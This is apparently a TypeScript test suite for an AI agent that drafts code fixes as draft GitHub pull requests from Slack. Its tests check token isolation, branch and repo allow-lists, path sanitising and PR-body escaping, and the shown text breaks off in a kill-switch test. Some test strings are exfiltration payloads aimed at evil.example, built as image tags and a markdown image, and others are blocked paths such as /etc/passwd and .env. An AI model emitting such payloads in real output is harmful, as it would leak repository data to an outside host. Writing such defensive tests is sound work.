import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { generateKeyPairSync } from 'node:crypto';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { DatabaseSync } from 'node:sqlite';
import { InMemoryTransport } from '@modelcontextprotocol/sdk/inMemory.js';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { loadConfig } from '../src/config.js';
import { loadAgent } from '../src/engine/agent.js';
import type { Engine } from '../src/engine/run.js';
import type { SessionRequest } from '../src/engine/session.js';
import { Store } from '../src/engine/store.js';
import type { Report } from '../src/investigate/report.js';
import { realGit, type Git } from '../src/mcp/reposync.js';
import { buildServer, type McpContext } from '../src/mcp/server.js';
import { Users } from '../src/mcp/users.js';
import { SlackOutbox, type SlackMessage, type Transport } from '../src/output/slack.js';
import { Issues } from '../src/patrol/issues.js';
import { ACTION, controlsFor, FIX_ACTION, onClick, type ButtonIds } from '../src/slack/buttons.js';
import { startButtons, type SocketClient } from '../src/slack/socket.js';
import { Fixer, prBody } from '../src/fix/draft.js';
import { FixGitHub, pushFixBranch } from '../src/fix/github.js';
import { FIX_REPOS, FixMap } from '../src/fix/repos.js';
import { fixPath, writeInto } from '../src/fix/tools.js';
import { fakeSession, ok, readResponse, say, type Script } from './fake-session.js';
import { testConfig } from './fake.js';

const tmp = (p: string) => mkdtempSync(join(tmpdir(), p));
const git = (...args: string[]) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.test', ...args], { encoding: 'utf8' }).trim();
const T0 = Date.parse('2026-11-03T08:00:00Z');
const at = (min: number) => new Date(T0 + min * 60_000);
// Not shaped like a real token (ghs_…), so redaction can't hide a leak from these tests.
const TOKEN = 'fix-app-token-NEVER-for-the-model-0123456789';
const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048, privateKeyEncoding: { type: 'pkcs1', format: 'pem' }, publicKeyEncoding: { type: 'spki', format: 'pem' } });
const ROWS = ['http|backend-production|/v1/auth/login|400', 'http|backend-production-mesh||400'];
const MONITOR_RUN = '20261103T080000Z-monitor-abc123';
const TITLE = 'Sign-in rejects emails with a trailing space';
const HYPOTHESIS = 'email validation rejects a trailing space';
const BUG = 'return email.toLowerCase();';
// A file name that ends the PR body's code span and paragraph, then loads an image whose URL is an entity.
const EVIL_PATH = 'a.ts\n\n<img src="&#104;ttps://evil.example/?d=repo-data">';
// Text outside a code span: only a tag that can't form is safe (no newline, no backtick needed).
const HTML_NOTE = 'See <picture><source srcset="&#104;ttps://evil.example/?d=repo-data"></picture> too.';
// Markup the body may hold: none outside a code span.
const tagsOutsideCode = (md: string) => md.replace(/`[^`\n]*`/g, '').match(/<[a-z/!][^\n]*/gi) ?? [];

// ---- GitHub: a local bare repo for git, and a fake REST API ------------------------

function remote() {
  const base = tmp('gh-');
  const bare = join(base, 'starkfuture', 'backend.git');
  mkdirSync(bare, { recursive: true });
  git('init', '-q', '--bare', '-b', 'main', bare);
  const work = tmp('work-');
  git('init', '-q', '-b', 'main', work);
  mkdirSync(join(work, 'src', 'auth'), { recursive: true });
  mkdirSync(join(work, 'test'));
  writeFileSync(join(work, 'src', 'auth', 'login.ts'), `export function normalizeEmail(email: string): string {\n  ${BUG}\n}\n`);
  writeFileSync(join(work, 'test', 'login.test.ts'), `import { normalizeEmail } from '../src/auth/login';\n`);
  git('-C', work, 'add', '-A');
  git('-C', work, 'commit', '-q', '--no-verify', '-m', 'init');
  git('-C', work, 'push', '-q', bare, 'main');
  const branches = () => git('--git-dir', bare, 'for-each-ref', '--format=%(refname:short)', 'refs/heads').split('\n').filter(Boolean);
  return { base: `file://${base}`, bare, main: git('--git-dir', bare, 'rev-parse', 'main'), branches };
}

type Call = { method: string; path: string; auth: string; body?: Record<string, unknown> };
function api(o: { bare?: string; draft?: boolean; prs?: Array<{ head: string; number: number }> } = {}) {
  const calls: Call[] = [];
  const prs = (o.prs ?? []).map((p) => ({ ...p, html_url: `https://github.com/starkfuture/backend/pull/${p.number}`, draft: true, state: 'open' }));
  const fetchImpl = (async (url: string, init: RequestInit) => {
    const u = new URL(url);
    const method = init.method ?? 'GET';
    const body = init.body ? (JSON.parse(String(init.body)) as Record<string, unknown>) : undefined;
    calls.push({ method, path: u.pathname, auth: (init.headers as Record<string, string>).Authorization!, ...(body ? { body } : {}) });
    const json = (status: number, j: unknown) => new Response(JSON.stringify(j), { status });
    const p = u.pathname;
    if (method === 'GET' && /^\/repos\/starkfuture\/[\w.-]+\/installation$/.test(p)) return json(200, { id: 77 });
    if (method === 'POST' && p === '/app/installations/77/access_tokens') return json(201, { token: TOKEN, expires_at: '2026-11-03T09:00:00Z' });
    if (method === 'GET' && /^\/repos\/starkfuture\/[\w.-]+$/.test(p)) return json(200, { default_branch: 'main' });
    if (method === 'GET' && /\/pulls$/.test(p)) return json(200, prs.filter((x) => `starkfuture:${x.head}` === u.searchParams.get('head')));
    const ref = /\/git\/ref\/heads\/(.+)$/.exec(p);
    if (method === 'GET' && ref) {
      try {
        git('--git-dir', o.bare!, 'rev-parse', '--verify', '--quiet', `refs/heads/${ref[1]}`);
        return json(200, {});
      } catch {
        return json(404, { message: 'Not Found' });
      }
    }
    if (method === 'POST' && /\/pulls$/.test(p)) {
      const pr = { head: String(body!.head), number: 101 + prs.length, html_url: `https://github.com/starkfuture/backend/pull/${101 + prs.length}`, draft: o.draft ?? body!.draft === true, state: 'open' };
      prs.push(pr);
      return json(201, pr);
    }
    return json(404, { message: 'Not Found' });
  }) as unknown as typeof fetch;
  return { fetchImpl, calls, prs };
}
// What the engine may ask GitHub: nothing that marks ready, merges or writes anything but one PR.
const ALLOWED = [/^GET \/repos\/starkfuture\/backend\/installation$/, /^POST \/app\/installations\/77\/access_tokens$/, /^GET \/repos\/starkfuture\/backend$/, /^GET \/repos\/starkfuture\/backend\/pulls$/, /^GET \/repos\/starkfuture\/backend\/git\/ref\/heads\/agent-engine\/fix-I-[0-9a-f]+$/, /^POST \/repos\/starkfuture\/backend\/pulls$/];

// ---- Slack: the bot, recording posts and message updates ---------------------------

type Sent = { text: string; blocks: unknown[]; thread_ts?: string | undefined; reply_broadcast?: boolean | undefined };
function bot(): Transport & { sent: Sent[]; updates: Array<{ ts: string } & SlackMessage> } {
  const sent: Sent[] = [];
  const updates: Array<{ ts: string } & SlackMessage> = [];
  return {
    threads: true,
    sent,
    updates,
    async post(m) {
      sent.push({ text: m.text, blocks: m.blocks, ...(m.thread_ts ? { thread_ts: m.thread_ts, reply_broadcast: m.reply_broadcast } : {}) });
      return `1700000000.${String(sent.length).padStart(6, '0')}`;
    },
    async update(ts, m) {
      updates.push({ ts, ...m });
    },
  };
}
const ROOT = '1700000000.000001';
type Block = { type: string; elements?: Array<{ action_id?: string; text?: string | { text: string } }> };
const buttons = (blocks: unknown[]) => (blocks as Block[]).filter((b) => b.type === 'actions').flatMap((b) => b.elements!.map((e) => e.action_id));
const note = (blocks: unknown[]) => (blocks as Block[]).filter((b) => b.type === 'context').map((b) => (b.elements![0]!.text as string) ?? '').at(-1) ?? '';
const IDS: ButtonIds = { app: 'A0TESTAPP', team: 'T0TESTTEAM', channel: 'C0TEST123' };
const RESPONSE = 'https://hooks.slack.com/actions/T0TESTTEAM/1700000100/AbCdEf';
let clicks = 0;
function payload(action: string, issue: string, o: { user?: string; channel?: string; team?: string; app?: string; actionTs?: string } = {}) {
  const channel = o.channel ?? IDS.channel;
  return {
    type: 'block_actions',
    api_app_id: o.app ?? IDS.app,
    team: { id: o.team ?? IDS.team },
    user: { id: o.user ?? 'U0ALICE', team_id: o.team ?? IDS.team },
    channel: { id: channel },
    container: { type: 'message', message_ts: ROOT, channel_id: channel, is_ephemeral: false },
    response_url: RESPONSE,
    actions: [{ action_id: action, block_id: 'issue_buttons', value: issue, type: 'button', action_ts: o.actionTs ?? `1700000100.${String(++clicks).padStart(6, '0')}` }],
  };
}

// The monitor's report behind the issue, as its run folder keeps it.
const report: Report = {
  title: TITLE,
  severity: 'major',
  status: 'active',
  started_at: '2026-11-03T07:45:00Z',
  what_broke: 'POST /v1/auth/login returns 400 for valid accounts',
  impact: '30 failed sign-ins in 15 min',
  cause: { hypothesis: HYPOTHESIS, confidence: 'medium' },
  evidence: [{ id: 'E-1a2b-1', quote: '/v1/auth/login 400 | 30', claim: 'the route returns 400' }],
  suggested_fix: 'trim the email before validating it',
  not_checked: [],
  rows: ROWS,
  issue: 'new',
};

// ---- the model: the codebase agent drafting a fix ---------------------------------

type Seen = { prompt?: string; snapshotFiles?: string[]; clone?: string; cloneConfig?: string; readBack?: string };
function fixModel(seen: Seen, o: { stopAfter?: string } = {}): Script {
  return async function* (sim) {
    seen.prompt = `${sim.req.system}\n${sim.req.prompt}`;
    seen.clone = /The folder you may read \((\S+) at HEAD/.exec(sim.req.prompt)?.[1];
    if (seen.clone) seen.cloneConfig = readFileSync(join(seen.clone, '.git', 'config'), 'utf8');
    const files = (d: string): string[] => readdirSync(d).flatMap((n) => (statSync(join(d, n)).isDirectory() ? files(join(d, n)) : [readFileSync(join(d, n), 'utf8')]));
    seen.snapshotFiles = files(sim.req.cwd);
    const path = join(sim.req.cwd, 'src', 'auth', 'login.ts');
    const read = await sim.builtin('Read', { file_path: path }, readResponse(path, readFileSync(path, 'utf8')));
    const id = /evidence_id: (E-[0-9a-f]{4}-\d+)/.exec(read)![1]!;
    for (const [t, args] of [
      ['edit_file', { path: 'src/auth/login.ts', old_string: BUG, new_string: 'return email.trim().toLowerCase();' }],
      ['write_file', { path: 'test/login-trim.test.ts', content: "test('a trailing space is trimmed', () => expect(normalizeEmail('a@b.c ')).toBe('a@b.c'));\n" }],
    ] as const) {
      const r = await sim.mcp(t, args);
      assert.equal(r.isError, false, r.text);
    }
    seen.readBack = readFileSync(path, 'utf8'); // what Read and Grep now see
    const evil = await sim.mcp('write_file', { path: EVIL_PATH, content: 'x' });
    assert.equal(evil.isError, true, 'a file name that would break the PR body is refused');
    const r = await sim.mcp('submit_fix', {
      summary: 'Trim the email before lowercasing it, so a trailing space no longer fails sign-in. ![x](https://evil.example/leak.png)',
      cause: 'normalizeEmail lowercases but never trims, and the validator rejects the space.',
      evidence: [{ id, quote: BUG }],
      test: 'test/login-trim.test.ts checks a trailing space is trimmed; run npm test.',
      notes: ['Other callers of normalizeEmail were not checked; ask @devs to look.', HTML_NOTE],
    });
    assert.equal(r.isError, false, r.text);
    if (o.stopAfter) {
      writeFileSync(o.stopAfter, 'now\n'); // the kill switch, before the run ends
      yield say('done');
    }
    yield ok(0.4, 6);
  };
}

// ---- the world: one issue posted with its buttons, and the fixer -------------------

function setup(o: { model?: Script; engine?: Partial<Engine>; github?: Omit<Parameters<typeof api>[0], 'bare'>; fix?: boolean; spent?: number; onGit?: (args: string[]) => void } = {}) {
  const c = testConfig();
  const db = join(c.runsDir, 'engine.db');
  const clock = { now: at(0) };
  const issues = new Issues(db);
  const t = bot();
  const box = new SlackOutbox(db, t, { now: () => clock.now, sleep: async () => {}, gapMs: 0, controls: controlsFor(issues, () => clock.now, o.fix !== false) });
  mkdirSync(join(c.runsDir, 'monitor', MONITOR_RUN), { recursive: true });
  writeFileSync(join(c.runsDir, 'monitor', MONITOR_RUN, 'output.json'), JSON.stringify([report]));
  const issue = issues.open({ title: TITLE, severity: 'major', rows: ROWS, hypothesis: HYPOTHESIS, run: MONITOR_RUN }, at(0));
  box.enqueue({ kind: 'report', message: { text: `${issue.id} report`, blocks: [] }, keys: ROWS, broadcast: true, issue: issue.id });
  const r = remote();
  const gh = api({ bare: r.bare, ...o.github });
  const seen: Seen = {};
  const session = fakeSession(o.model ?? fixModel(seen));
  const store = new Store(db);
  if (o.spent) {
    store.admit({ id: 'earlier', agent: 'codebase', version: 'x', trigger: 'manual', now: at(0), deadlineMs: 60_000, reserve: o.spent, agentCap: 100, globalCap: 100, concurrency: 3 });
    store.settle('earlier', { status: 'ok', cost: o.spent, turns: 1, outputs: 1, now: at(0) });
  }
  const engine: Engine = { store, runsDir: c.runsDir, stopFile: join(c.runsDir, 'STOP'), session, dailyCapUsd: 1000, llmAvailable: true, now: () => clock.now, ...o.engine };
  const replies: Array<[string, string]> = [];
  const logs: string[] = [];
  const gits: string[][] = [];
  const recordGit: Git = (args, opts) => {
    gits.push(args);
    o.onGit?.(args);
    return realGit(args, opts);
  };
  const fixer = new Fixer({
    issues,
    outbox: box,
    engine,
    agent: loadAgent(join(c.agentsDir, 'codebase')),
    map: FixMap.load(join(import.meta.dirname, '..', 'config', 'fixes.yaml')),
    github: new FixGitHub({ appId: '4242', privateKey }, gh.fetchImpl, 'https://api.github.test'),
    log: (s) => logs.push(s),
    respond: async (url, text) => void replies.push([url, text]),
    git: recordGit,
    gitBase: r.base,
    now: () => clock.now,
  });
  const ctx = { issues, outbox: box, ids: IDS, now: () => clock.now, fix: fixer };
  // A click as Socket Mode handles it: recorded, acknowledged, replied to, flushed, then the work.
  const click = async (issue: string, by: Parameters<typeof payload>[2] = {}) => {
    const res = onClick(payload(FIX_ACTION, issue, by), ctx);
    if (res.reply) replies.push([res.respondTo ?? '', res.reply]);
    await box.flush();
    await res.after?.();
    return res;
  };
  return { c, db, clock, issues, t, box, issue, r, gh, seen, session, engine, fixer, ctx, click, replies, logs, gits };
}
const flushed = async (w: ReturnType<typeof setup>) => {
  await w.box.flush();
  return w;
};
const fixEvents = (w: ReturnType<typeof setup>) => w.issues.events(w.issue.id).filter((e) => e.type.startsWith('fix_'));

// ---- the happy path, over Socket Mode ---------------------------------------------

test('Draft a fix: recorded before the ack, then the engine pushes agent-engine/fix-<id>, opens a draft PR and posts its link once in the thread', async () => {
  const w = await flushed(setup());
  const id = w.issue.id;
  assert.deepEqual(buttons(w.t.sent[0]!.blocks), [ACTION.acknowledged, ACTION.dismissed, FIX_ACTION], 'a third button on an open issue');

  const handlers = new Map<string, (a: { body?: unknown; ack?: () => Promise<void> }) => void>();
  const client: SocketClient = { on: (e, f) => handlers.set(e, f), start: async () => {}, disconnect: async () => {} };
  const socketReplies: string[] = [];
  const socket = startButtons({ appToken: 'xapp-1-A0TESTAPP-1-abcdef', appId: IDS.app, channel: IDS.channel, team: async () => IDS.team, issues: w.issues, outbox: w.box, log: () => {}, client: () => client, respond: async (_u, text) => void socketReplies.push(text), now: () => w.clock.now, fix: w.fixer });
  await socket.ready;
  const atAck: Array<string | undefined> = [];
  handlers.get('interactive')!({ body: payload(FIX_ACTION, id, { user: 'U0ALICE' }), ack: async () => void atAck.push(w.issues.fix(id)?.kind) });
  const ended = () => fixEvents(w).some((e) => e.type === 'fix_drafted' || e.type === 'fix_failed');
  for (let i = 0; i < 6000 && !ended(); i++) await new Promise((r) => setTimeout(r, 10)); // git and a fake model: seconds under a loaded test run
  await socket.stop();

  assert.deepEqual(atAck, ['pending'], 'persisted before the ack');
  assert.match(socketReplies[0]!, new RegExp(`^Drafting a fix for ${id} in starkfuture/backend…`));
  assert.match(note(w.t.updates[0]!.blocks), /🛠 Drafting a fix in backend: asked by <@U0ALICE> at 11-03 08:00Z\./);
  assert.ok(!buttons(w.t.updates[0]!.blocks).includes(FIX_ACTION), 'no button while it is being drafted');

  // The branch, from main, with the model's two files; main untouched.
  const branch = `agent-engine/fix-${id}`;
  assert.deepEqual(w.r.branches().sort(), [branch, 'main']);
  assert.equal(git('--git-dir', w.r.bare, 'rev-parse', 'main'), w.r.main);
  assert.equal(git('--git-dir', w.r.bare, 'rev-parse', `${branch}^`), w.r.main);
  assert.deepEqual(git('--git-dir', w.r.bare, 'diff-tree', '--no-commit-id', '--name-only', '-r', branch).split('\n'), ['src/auth/login.ts', 'test/login-trim.test.ts']);
  assert.match(git('--git-dir', w.r.bare, 'show', `${branch}:src/auth/login.ts`), /return email\.trim\(\)\.toLowerCase\(\);/);
  const msg = git('--git-dir', w.r.bare, 'log', '-1', '--format=%an%n%B', branch);
  assert.match(msg, new RegExp(`^agent-engine\\nDraft fix: ${TITLE}\\n\\nIssue ${id}`));
  assert.ok(!/co-authored-by/i.test(msg));
  assert.equal(w.seen.readBack, `export function normalizeEmail(email: string): string {\n  return email.trim().toLowerCase();\n}\n`, 'the model reads its own edits');

  // GitHub: a token for this repo only, and one draft PR; nothing else.
  for (const c of w.gh.calls) assert.ok(ALLOWED.some((re) => re.test(`${c.method} ${c.path}`)), `${c.method} ${c.path}`);
  assert.deepEqual(w.gh.calls.find((c) => c.path.endsWith('/access_tokens'))!.body, { repositories: ['backend'], permissions: { contents: 'write', pull_requests: 'write' } });
  const open = w.gh.calls.filter((c) => c.method === 'POST' && c.path.endsWith('/pulls'));
  assert.equal(open.length, 1);
  const pr = open[0]!.body!;
  assert.equal(pr.draft, true);
  assert.deepEqual([pr.head, pr.base, pr.title], [branch, 'main', `Draft fix: ${TITLE}`]);
  const body = String(pr.body);
  for (const part of [id, '/v1/auth/login 400 | 30', HYPOTHESIS, 'normalizeEmail lowercases but never trims', BUG, 'Other callers of normalizeEmail', 'Generated by agent-engine; review before marking ready'])
    assert.ok(body.includes(part), `the body has ${part}`);
  assert.ok(!body.includes('@devs') && body.includes('@​devs'), 'no @-mention that would notify anyone');
  assert.ok(!body.includes('evil.example/leak.png'), 'no image');
  assert.deepEqual(tagsOutsideCode(body), [], 'no HTML from the model');
  assert.ok(body.includes('See &lt;picture&gt;&lt;source srcset="&#104;ttps://evil.example/?d=repo-data"&gt;&lt;/picture&gt; too.'), 'shown as text');

  // Recorded, and its link once in the thread, not in the channel.
  const url = 'https://github.com/starkfuture/backend/pull/101';
  assert.deepEqual(fixEvents(w).map((e) => [e.type, e.data.url ?? null]), [['fix_requested', null], ['fix_drafted', url]]);
  const posts = w.t.sent.slice(1);
  assert.equal(posts.length, 1);
  assert.deepEqual([posts[0]!.thread_ts, posts[0]!.reply_broadcast], [ROOT, false]);
  assert.match(JSON.stringify(posts[0]!.blocks), new RegExp(`<${url}\\|starkfuture/backend#101>, asked by <@U0ALICE>`));
  assert.match(note(w.t.updates.at(-1)!.blocks), new RegExp(`🛠 Draft fix: <${url}\\|backend#101>, asked by <@U0ALICE>`));
  assert.ok(buttons(w.t.updates.at(-1)!.blocks).includes(FIX_ACTION));

  // get_run and get_evidence read the fix run.
  const run = String(fixEvents(w)[1]!.data.run);
  const users = Users.load(join(tmp('users-'), 'users.json'));
  users.add('dev');
  const ctx: McpContext = { cfg: { ...w.c, mcp: { ...w.c.mcp, usersFile: users.file } }, engine: w.engine, users, repos: new Map(), issues: w.issues };
  const [ct, st] = InMemoryTransport.createLinkedPair();
  await buildServer(ctx, users.list()[0]!).connect(st);
  const mcp = new Client({ name: 't', version: '1' });
  await mcp.connect(ct);
  const got = (await mcp.callTool({ name: 'get_run', arguments: { run_id: run } })) as { content: Array<{ text: string }> };
  assert.match(got.content[0]!.text, new RegExp(`codebase@\\w+ · ok[\\s\\S]*# Draft fix for ${id}[\\s\\S]*Draft pull request: ${url}[\\s\\S]*- src/auth/login.ts\\n- test/login-trim.test.ts`));
  const ev = /- (E-[0-9a-f]{4}-\d+): “/.exec(got.content[0]!.text)![1]!;
  const evidence = (await mcp.callTool({ name: 'get_evidence', arguments: { run_id: run, evidence_id: ev } })) as { content: Array<{ text: string }> };
  assert.match(evidence.content[0]!.text, /return email\.toLowerCase\(\);/);

  // A second click links the PR: no new run, no new PR.
  const again = await w.click(id, { user: 'U0BOB' });
  assert.equal(again.reply, `${id} already has its draft fix: ${url}`);
  assert.equal(w.session.requests.length, 1);
  assert.equal(w.gh.calls.filter((c) => c.method === 'POST' && c.path.endsWith('/pulls')).length, 1);
});

// ---- safety ---------------------------------------------------------------------------

test('the model never gets the token: not in its prompt, its files or the checkout, and the token is asked for this repo only', async () => {
  const w = await flushed(setup());
  await w.click(w.issue.id);
  assert.equal(w.issues.fix(w.issue.id)?.kind, 'drafted');
  const basic = Buffer.from(`x-access-token:${TOKEN}`).toString('base64');
  assert.ok(w.seen.prompt && !w.seen.prompt.includes(TOKEN) && !w.seen.prompt.includes(basic));
  assert.ok(w.seen.snapshotFiles!.length >= 2 && w.seen.snapshotFiles!.every((f) => !f.includes(TOKEN)));
  assert.ok(w.seen.cloneConfig && !w.seen.cloneConfig.includes(TOKEN) && !w.seen.cloneConfig.includes(basic), 'the checkout stores no credential');
  const req: SessionRequest = w.session.requests[0]!;
  assert.deepEqual(req.tools.map((t) => t.name).sort(), ['edit_file', 'submit_fix', 'write_file']);
  assert.ok(w.logs.every((l) => !l.includes(TOKEN)));
  assert.ok(w.gits.every((a) => !a.join(' ').includes(TOKEN) && !a.join(' ').includes(basic)), 'never in git argv');
  for (const f of readdirSync(join(w.c.runsDir, 'codebase'), { recursive: true }).map(String)) {
    const p = join(w.c.runsDir, 'codebase', f);
    if (statSync(p).isFile()) assert.ok(!readFileSync(p, 'utf8').includes(TOKEN), `not in ${f}`);
  }
  // Repo-scoped calls carry the installation token; the App's own calls a JWT.
  assert.ok(w.gh.calls.every((c) => (c.path.startsWith('/app/') || c.path.endsWith('/installation') ? /^Bearer [\w-]+\.[\w-]+\.[\w-]+$/.test(c.auth) : c.auth === `Bearer ${TOKEN}`)));
});

test('the push refuses any branch but agent-engine/fix-<issue>, and any repo off the list; it never forces', async () => {
  const calls: string[][] = [];
  const fake: Git = async (args) => {
    calls.push(args);
    return '';
  };
  const o = { dir: '/x', repo: 'backend', base: 'https://github.com', token: TOKEN };
  for (const branch of ['main', 'master', 'release/2026-11', 'agent-engine/fixes', 'agent-engine/fix-I-1234:refs/heads/main', '+agent-engine/fix-I-1234', 'agent-engine/fix-I-123456789', 'refs/heads/agent-engine/fix-I-1234'])
    await assert.rejects(pushFixBranch(fake, { ...o, branch }), /only agent-engine\/fix-<issue> branches/, branch);
  await assert.rejects(pushFixBranch(fake, { ...o, repo: 'keycloak-stark', branch: 'agent-engine/fix-I-1234' }), /not a repo the engine may open fixes in/);
  assert.equal(calls.length, 0, 'git never ran');
  await pushFixBranch(fake, { ...o, branch: 'agent-engine/fix-I-1234' });
  assert.deepEqual(calls, [['-C', '/x', '-c', 'core.hooksPath=/dev/null', 'push', '--no-verify', '--porcelain', 'https://github.com/starkfuture/backend.git', 'HEAD:refs/heads/agent-engine/fix-I-1234']]);
});

test('the pull request is opened as a draft; GitHub answering otherwise is an error, and the client can neither mark ready nor merge', async () => {
  const gh = api({ draft: false });
  const app = new FixGitHub({ appId: '4242', privateKey }, gh.fetchImpl, 'https://api.github.test');
  await assert.rejects(app.openDraft('backend', { branch: 'agent-engine/fix-I-1234', base: 'main', title: 't', body: 'b' }, TOKEN), /as ready for review, not as a draft/);
  assert.equal(gh.calls[0]!.body!.draft, true);
  await assert.rejects(app.openDraft('backend', { branch: 'main', base: 'main', title: 't', body: 'b' }, TOKEN), /only agent-engine\/fix-<issue> branches/);
  assert.equal(gh.calls.length, 1);
  assert.deepEqual(Object.getOwnPropertyNames(FixGitHub.prototype).sort(), ['branchExists', 'call', 'constructor', 'defaultBranch', 'findPr', 'openDraft', 'token']);

  // In the job: recorded as no PR, and the clicker hears so.
  const w = await flushed(setup({ github: { draft: false } }));
  await w.click(w.issue.id);
  assert.equal(w.issues.fix(w.issue.id), undefined);
  assert.match(String(fixEvents(w).at(-1)!.data.reason), /as ready for review, not as a draft/);
  assert.match(w.replies.at(-1)![1], /^No draft pull request for I-[0-9a-f]+: GitHub opened https:\/\/github.com\/starkfuture\/backend\/pull\/101 as ready for review, not as a draft: mark it draft by hand\. The branch agent-engine\/fix-I-[0-9a-f]+ is on GitHub\.$/);
});

test('only the seven repos: config/fixes.yaml can name no other, and the App asks no token for one', async () => {
  assert.deepEqual([...FIX_REPOS].sort(), ['admin-next', 'argo-cd', 'backend', 'backend-nest', 'frontend-next', 'web-admin', 'web-admin-cms']);
  assert.throws(() => new FixMap({ repos: [{ repo: 'keycloak-stark', service: 'keycloak' }] }), /repo/);
  assert.throws(() => new FixMap({ repos: [{ repo: 'backend' }] }), /needs section, service, route or status/);
  const gh = api();
  const app = new FixGitHub({ appId: '4242', privateKey }, gh.fetchImpl, 'https://api.github.test');
  for (const repo of ['keycloak-stark', 'agent-engine', '../backend', 'backend-nest/../x']) {
    await assert.rejects(app.token(repo), /not a repo the engine may open fixes in/);
    await assert.rejects(app.findPr(repo, 'agent-engine/fix-I-1234', TOKEN), /not a repo/);
  }
  assert.equal(gh.calls.length, 0);
  assert.throws(() => new FixGitHub({ appId: 'abc', privateKey }), /must be a number/);
});

test('the repo map: real service names to their repos; the repo most rows map to wins', () => {
  const m = FixMap.load(join(import.meta.dirname, '..', 'config', 'fixes.yaml'));
  const cases: Array<[string, string | undefined]> = [
    ['http|backend-production|/v1/auth/login|400', 'backend'],
    ['http|backend-production-mesh||503', 'backend'],
    ['http|ecom-service-production|/v3/ecom/cart|404', 'backend-nest'],
    ['traces|auth-service-production|POST /v3/auth/session/derive-web|', 'backend-nest'],
    ['traces|auth-service|POST /v3/auth/session|', 'backend-nest'],
    ['errors|erp-broker-service-production|vin-queue Timeout|', 'backend-nest'],
    ['workload|stock-sync-service-production|restarts app|', 'backend-nest'],
    ['logs|frontend-next-production|[next] Failed to fetch <n>|', 'frontend-next'],
    ['logs|web-admin-production|x|', 'web-admin'],
    ['logs|web-admin-cms-production|x|', 'web-admin-cms'],
    ['http|keycloak|/auth/realms/stark/token|500', undefined],
    ['http|backend-production-other|/x|500', undefined],
  ];
  for (const [k, repo] of cases) assert.equal(m.repoOf(k), repo, k);
  assert.equal(m.repoFor(['http|ecom-service-production|/a|500', 'http|backend-production|/b|500', 'http|auth-service-production|/c|500']), 'backend-nest');
  assert.equal(m.repoFor(['http|ecom-service-production|/a|500', 'http|backend-production|/b|500']), 'backend', 'a tie: the rule listed first');
  assert.equal(m.repoFor(['http|keycloak|/x|500']), undefined);
});

test('the edit tools write only plain repo files: no escapes, git internals, workflows or secrets, and never through a symlink', () => {
  const root = tmp('snap-');
  mkdirSync(join(root, 'src'));
  for (const p of ['../x.ts', '/etc/passwd', '~/x', '.git/config', 'sub/.GIT/hooks/pre-commit', '.env', 'config/prod.pem', '.github/workflows/ci.yml', 'a\\b.ts', '', EVIL_PATH, 'a b.ts', 'a`b`.ts', 'a&b.ts', 'a<b>.ts', 'bell\u0007.ts', 'tab\t.ts'])
    assert.ok('error' in fixPath(root, p), p);
  assert.deepEqual(fixPath(root, 'src/a.ts'), { rel: 'src/a.ts' });
  assert.deepEqual(fixPath(root, 'app/[locale]/(shop)/@modal/page.test.tsx'), { rel: 'app/[locale]/(shop)/@modal/page.test.tsx' }, 'Next.js route folders');
  assert.deepEqual(fixPath(root, './src/a.ts'), { rel: 'src/a.ts' });
  assert.deepEqual(fixPath(root, join(root, 'src', 'a.ts')), { rel: 'src/a.ts' });
  const outside = tmp('outside-');
  symlinkSync(outside, join(root, 'linked'));
  symlinkSync(join(outside, 'f.ts'), join(root, 'f.ts'));
  assert.throws(() => writeInto(root, 'linked/x.ts', 'x'), /outside/);
  assert.throws(() => writeInto(root, 'f.ts', 'x'), /symlink/);
  assert.deepEqual(readdirSync(outside), [], 'nothing written outside');
  writeInto(root, 'src/new/b.ts', 'ok');
  assert.equal(readFileSync(join(root, 'src', 'new', 'b.ts'), 'utf8'), 'ok');
});

test('file names in the PR body go through the same sanitiser: one line, in a code span, never HTML', async () => {
  const w = await flushed(setup());
  const issue = w.issues.get(w.issue.id)!;
  const fix = { summary: 'Trim the email.\n\n<img src="&#104;ttps://evil.example/a">', cause: 'It is never trimmed.', evidence: [{ id: 'E-0000-1', quote: BUG }], test: 'npm test', notes: [HTML_NOTE] };
  const run = { runId: '20261103T081500Z-codebase-abcdef', status: 'ok' as const, outputs: [fix], evidence: undefined as never, cost: 0.4, turns: 6 };
  const body = prBody({ issue, report, fix, files: ['app/[locale]/(shop)/page.tsx', EVIL_PATH], run, agent: loadAgent(join(w.c.agentsDir, 'codebase')) });
  assert.equal(body.split('\n').find((l) => l.startsWith('Files: ')), 'Files: `app/[locale]/(shop)/page.tsx`, `a.ts [image removed]`');
  assert.deepEqual(tagsOutsideCode(body), []);
  assert.ok(!body.includes('\n\n<') && !body.includes('<img'));
  const sneaky = prBody({ issue, report, fix, files: ['a.ts\n\n<source srcset="&#104;ttps://evil.example/b">'], run, agent: loadAgent(join(w.c.agentsDir, 'codebase')) });
  assert.equal(sneaky.split('\n').find((l) => l.startsWith('Files: ')), 'Files: `a.ts <source srcset="&#104;ttps://evil.example/b">`', 'inert: inside one code span');
  assert.deepEqual(tagsOutsideCode(sneaky), []);
});

// ---- spend, stops and failures ---------------------------------------------------------

test("a spend cap refuses: the clicker hears it, it is recorded, nothing is pushed, and the button is back", async () => {
  const w = await flushed(setup({ spent: 9.5 })); // the codebase agent's $10 a day, with $2 a run
  const id = w.issue.id;
  await w.click(id);
  assert.equal(w.session.requests.length, 0, 'no model run');
  assert.match(w.replies.at(-1)![1], new RegExp(`^No fix drafted for ${id}: agent daily cap \\$10 reached\\. Nothing was pushed\\.$`));
  assert.deepEqual(fixEvents(w).map((e) => [e.type, e.data.reason ?? null]), [['fix_requested', null], ['fix_failed', 'agent daily cap $10 reached']]);
  assert.deepEqual(w.r.branches(), ['main']);
  assert.ok(!w.gh.calls.some((c) => c.method === 'POST' && c.path.endsWith('/pulls')));
  assert.ok(buttons(w.t.updates.at(-1)!.blocks).includes(FIX_ACTION));
  assert.equal(note(w.t.updates.at(-1)!.blocks), '', 'no pending line');
  assert.equal(w.t.sent.length, 1, 'nothing posted in the channel or thread');
});

test('a run stopped by the kill switch pushes nothing, even with a fix submitted', async () => {
  const stopFile = join(tmp('stop-'), 'STOP');
